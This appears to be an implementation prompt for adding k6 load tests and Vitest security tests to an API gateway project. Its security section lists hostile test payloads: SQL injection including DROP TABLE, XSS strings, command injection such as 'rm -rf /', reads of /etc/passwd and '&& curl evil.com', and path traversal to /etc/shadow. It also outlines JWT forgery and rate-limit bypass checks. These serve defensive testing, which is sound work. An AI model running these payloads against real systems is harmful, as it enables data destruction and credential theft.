# Load & Security Testing Implementation Prompt (P5-001 & P5-002)

> Implement load testing and security testing suites for F.R.I.D.A.Y.

---

## Context

The system currently has:
- ~746 unit/integration tests across 39 files (Vitest)
- Fastify gateway on port 18789 with JWT + API key + RBAC auth
- WebSocket endpoint at `/ws/metrics` for real-time updates
- SQLite databases (WAL mode) for audit, auth, tasks, soul, integrations, RBAC, brain, comms
- Rate limiting (5 auth attempts/15min, 100 API requests/min)
- Input validation with injection detection
- Sandbox execution (V1 soft + V2 Landlock on Linux, sandbox-exec on macOS)
- CI pipeline: lint -> typecheck -> test -> build -> security audit -> docker build
- Vitest config at `packages/core/vitest.config.ts` with 80% coverage thresholds
- Brain system (memory, knowledge, skills) with REST API
- E2E encrypted agent communication (comms)
- Model fallback chain on rate limits / provider unavailability
- mTLS support with client certificate authentication

---

## Part 1: Load Testing with k6 (P5-001)

### 1.1 Install k6 and create test structure

```bash
mkdir -p tests/load
```

Create `tests/load/` directory with k6 scripts. k6 is installed separately (Go binary), not via npm.

### 1.2 Create `tests/load/helpers.js`

Shared utilities for all k6 scripts:

```javascript
import http from 'k6/http';

export const BASE_URL = __ENV.BASE_URL || 'http://127.0.0.1:18789';

export function login(password) {
  const res = http.post(`${BASE_URL}/api/v1/auth/login`, JSON.stringify({ password }), {
    headers: { 'Content-Type': 'application/json' },
  });
  return JSON.parse(res.body);
}

export function authHeaders(token) {
  return { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' };
}
```

### 1.3 Create `tests/load/api-endpoints.js`

Test all API endpoints under sustained load:

**Scenarios:**

1. **Sustained load** -- 50 VUs for 5 minutes
   - `GET /health` (unauthenticated)
   - `GET /api/v1/metrics` (authenticated)
   - `GET /api/v1/tasks` (with pagination)
   - `GET /api/v1/security/events` (with filters)
   - `GET /api/v1/audit` (with time range)
   - `GET /api/v1/soul/personality` (authenticated)
   - `GET /api/v1/integrations` (authenticated)
   - `GET /api/v1/brain/stats` (authenticated)

2. **Spike test** -- Ramp 0 -> 200 VUs in 30s, hold 1 min, ramp down
   - Same endpoints as sustained load

3. **Stress test** -- Ramp to 500 VUs over 5 minutes
   - Focus on `/api/v1/metrics` and `/health`

**Thresholds:**
```javascript
export const options = {
  thresholds: {
    http_req_duration: ['p(95)<200', 'p(99)<500'],  // p95 < 200ms, p99 < 500ms
    http_req_failed: ['rate<0.01'],                   // < 1% error rate
    http_reqs: ['rate>100'],                          // > 100 req/s throughput
  },
};
```

**Setup:** Login once in `setup()`, share token across VUs.

### 1.4 Create `tests/load/auth-flow.js`

Test the authentication flow under load:
- Login -> use token -> refresh -> logout cycle
- Rate limit testing (verify 429 after 5 attempts/15min)
- Concurrent token refresh (test deduplication)
- Invalid token handling under load

**Thresholds:**
```javascript
thresholds: {
  'http_req_duration{name:login}': ['p(95)<500'],
  'http_req_duration{name:refresh}': ['p(95)<200'],
  'http_req_failed{name:login}': ['rate<0.05'],
}
```

### 1.5 Create `tests/load/websocket.js`

Test WebSocket scaling:

```javascript
import ws from 'k6/ws';

export default function () {
  const url = `ws://${BASE_URL.replace('http://', '')}/ws/metrics`;
  const res = ws.connect(url, {}, function (socket) {
    socket.on('open', () => {
      socket.send(JSON.stringify({
        type: 'subscribe',
        payload: { channels: ['metrics', 'tasks', 'security'] },
      }));
    });

    socket.on('message', (msg) => {
      // Track message latency
      const data = JSON.parse(msg);
      if (data.timestamp) {
        const latency = Date.now() - data.timestamp;
        wsLatency.add(latency);
      }
    });

    // Hold connection for 30 seconds
    socket.setTimeout(() => socket.close(), 30000);
  });
}
```

**Scenarios:**
- 50 concurrent WebSocket connections for 2 minutes
- 200 concurrent connections (stress)
- Rapid connect/disconnect cycling

**Thresholds:**
```javascript
thresholds: {
  ws_connecting: ['p(95)<100'],     // Connection time < 100ms
  ws_session_duration: ['p(95)>25000'], // Sessions last at least 25s
}
```

### 1.6 Create `tests/load/task-creation.js`

Test task submission throughput:
- Submit tasks via `POST /api/v1/tasks` at increasing rates
- Monitor queue depth via `/api/v1/metrics`
- Verify task completion under load
- Test concurrent task creation (20 tasks/min limit per user)

### 1.7 Create `tests/load/run.sh`

```bash
#!/bin/bash
# Run all load tests against local or specified target
BASE_URL=${1:-http://127.0.0.1:18789}
ADMIN_PASSWORD=${2:-your-admin-password}

echo "Running load tests against $BASE_URL"

k6 run --env BASE_URL="$BASE_URL" --env ADMIN_PASSWORD="$ADMIN_PASSWORD" \
  tests/load/api-endpoints.js

k6 run --env BASE_URL="$BASE_URL" --env ADMIN_PASSWORD="$ADMIN_PASSWORD" \
  tests/load/auth-flow.js

k6 run --env BASE_URL="$BASE_URL" --env ADMIN_PASSWORD="$ADMIN_PASSWORD" \
  tests/load/websocket.js

k6 run --env BASE_URL="$BASE_URL" --env ADMIN_PASSWORD="$ADMIN_PASSWORD" \
  tests/load/task-creation.js
```

---

## Part 2: Security Testing (P5-002)

### 2.1 Create `tests/security/` directory

```bash
mkdir -p tests/security
```

### 2.2 Create `tests/security/injection.test.ts`

Vitest-based security tests that validate InputValidator coverage:

**SQL Injection:**
```typescript
const SQL_PAYLOADS = [
  "'; DROP TABLE users; --",
  "1 OR 1=1",
  "' UNION SELECT * FROM audit --",
  "1; EXEC xp_cmdshell('cmd')",
  "' OR ''='",
];

for (const payload of SQL_PAYLOADS) {
  it(`should block SQL injection: ${payload.slice(0, 30)}`, async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/v1/tasks',
      headers: authHeaders(token),
      payload: { type: 'query', input: { command: payload } },
    });
    // Should either reject (400) or sanitize -- never execute
    expect([400, 200]).toContain(res.statusCode);
    if (res.statusCode === 200) {
      // Verify payload was sanitized, not executed
      const body = JSON.parse(res.body);
      expect(body.error).toBeUndefined();
    }
  });
}
```

**XSS:**
```typescript
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '<svg onload=alert(1)>',
  '"><script>document.cookie</script>',
];
```

**Command Injection:**
```typescript
const CMD_PAYLOADS = [
  '; rm -rf /',
  '| cat /etc/passwd',
  '$(whoami)',
  '`id`',
  '&& curl evil.com',
];
```

**Path Traversal:**
```typescript
const PATH_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32',
  '/etc/shadow',
  '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  'file:///etc/passwd',
];
```

### 2.3 Create `tests/security/jwt-manipulation.test.ts`

Test JWT token security:
- **Expired tokens**: Forge token with past expiry -> expect 401
- **Invalid signature**: Modify payload without re-signing -> expect 401
- **Algorithm confusion**: Send token with `alg: none` -> expect 401
- **Token reuse after logout**: Logout, then use same token -> expect 401
- **Refresh token rotation**: Use refresh token twice -> expect 401 on second use
- **Token with wrong secret**: Sign with different secret -> expect 401
- **Missing claims**: Remove userId/role from payload -> expect 401/403

### 2.4 Create `tests/security/rate-limit-bypass.test.ts`

Test rate limiter robustness:
- **Basic enforcement**: Exceed 5 login attempts -> expect 429
- **IP spoofing**: Set `X-Forwarded-For` header -> verify ignored (`trustProxy: false`)
- **User rotation**: Try different usernames -> verify IP-based limit still applies
- **Window reset**: Wait for window to expire -> verify limit resets
- **Concurrent requests**: Fire 20 simultaneous requests -> verify atomic counting
- **API key limits**: Exceed per-key rate limit -> expect 429

### 2.5 Create `tests/security/rbac-enforcement.test.ts`

Test RBAC permission boundaries:
- **Viewer cannot write**: Try POST/PUT/DELETE with viewer role -> expect 403
- **Auditor limited access**: Verify read-only on audit/security, no write
- **Operator boundaries**: Can write tasks/soul/integrations, cannot manage auth
- **Admin full access**: All endpoints accessible
- **Unmapped routes**: Verify default-deny (admin-only)
- **Role escalation**: Try to change own role -> expect 403

### 2.6 Create `tests/security/audit-integrity.test.ts`

Test audit chain tamper resistance:
- **Chain verification**: Verify chain after normal operations
- **Tamper detection**: Modify an audit entry -> verify chain breaks
- **Gap detection**: Delete an audit entry -> verify chain detects gap
- **Signing key rotation**: Rotate key -> verify old entries still validate
- **Concurrent writes**: Write audit entries concurrently -> verify chain integrity

### 2.7 Create `tests/security/sandbox-escape.test.ts`

Test sandbox boundaries (skip on platforms without sandbox):
- **Filesystem escape**: Try to read outside allowed paths
- **Write to restricted paths**: Try to write to /etc, /usr
- **Resource exhaustion**: Allocate > maxMemoryMb -> verify violation
- **CPU time bomb**: Spin loop exceeding maxCpuPercent -> verify violation
- **Path traversal in config**: Use `../` in allowedReadPaths -> verify rejection

### 2.8 Dependency audit script

Create `tests/security/audit-deps.sh`:
```bash
#!/bin/bash
echo "=== npm audit ==="
npm audit --audit-level=moderate

echo "=== Checking for known vulnerable packages ==="
# Check for specific known-bad versions
npm ls --all 2>/dev/null | grep -E "(lodash@[0-3]|minimist@0\.|node-fetch@[0-1])" && {
  echo "WARN: Potentially vulnerable packages found"
  exit 1
}

echo "=== License check ==="
npx license-checker --production --failOn "GPL-3.0;AGPL-3.0" 2>/dev/null || {
  echo "WARN: license-checker not available, skipping"
}
```

---

## Part 3: CI Integration

### 3.1 Add security tests to CI

Update `.github/workflows/ci.yml` to add a security-test job:

```yaml
security-test:
  needs: [test]
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-node@v4
      with: { node-version: '20' }
    - run: npm ci
    - run: cd packages/shared && npx tsc
    - name: Run security tests
      run: npx vitest run tests/security/ --reporter=verbose
      env:
        SECUREYEOMAN_SIGNING_KEY: ${{ secrets.TEST_SIGNING_KEY || 'test-signing-key-at-least-32-characters' }}
        SECUREYEOMAN_TOKEN_SECRET: ${{ secrets.TEST_TOKEN_SECRET || 'test-token-secret-at-least-32-chars!!' }}
        SECUREYEOMAN_ENCRYPTION_KEY: ${{ secrets.TEST_ENCRYPTION_KEY || 'test-encryption-key-32-characters!!' }}
        SECUREYEOMAN_ADMIN_PASSWORD: ${{ secrets.TEST_ADMIN_PASSWORD || 'test-admin-password-32chars!!' }}
```

### 3.2 Add load test to CI (optional, long-running)

Create `.github/workflows/load-test.yml`:
- Trigger: manual (`workflow_dispatch`) or weekly schedule
- Spin up the server, run k6 tests, upload results as artifacts
- Fail on threshold violations

---

## Files to Create/Modify

| File | Action |
|------|--------|
| `tests/load/helpers.js` | Create |
| `tests/load/api-endpoints.js` | Create |
| `tests/load/auth-flow.js` | Create |
| `tests/load/websocket.js` | Create |
| `tests/load/task-creation.js` | Create |
| `tests/load/run.sh` | Create |
| `tests/security/injection.test.ts` | Create |
| `tests/security/jwt-manipulation.test.ts` | Create |
| `tests/security/rate-limit-bypass.test.ts` | Create |
| `tests/security/rbac-enforcement.test.ts` | Create |
| `tests/security/audit-integrity.test.ts` | Create |
| `tests/security/sandbox-escape.test.ts` | Create |
| `tests/security/audit-deps.sh` | Create |
| `.github/workflows/ci.yml` | Modify (add security-test job) |
| `.github/workflows/load-test.yml` | Create (optional) |
| `TODO.md` | Update P5-001, P5-002 |

---

## Acceptance Criteria

- [ ] k6 load tests cover all API endpoints with sustained + spike scenarios
- [ ] WebSocket load test validates 50+ concurrent connections
- [ ] Security tests cover OWASP top 10 vectors (injection, broken auth, RBAC bypass)
- [ ] JWT manipulation tests verify token security
- [ ] Rate limit bypass tests confirm enforcement
- [ ] Audit chain tamper tests pass
- [ ] Sandbox escape tests pass (platform-appropriate)
- [ ] CI pipeline includes security test job
- [ ] All existing ~746 tests continue to pass
- [ ] Load test thresholds: p95 < 200ms, error rate < 1%
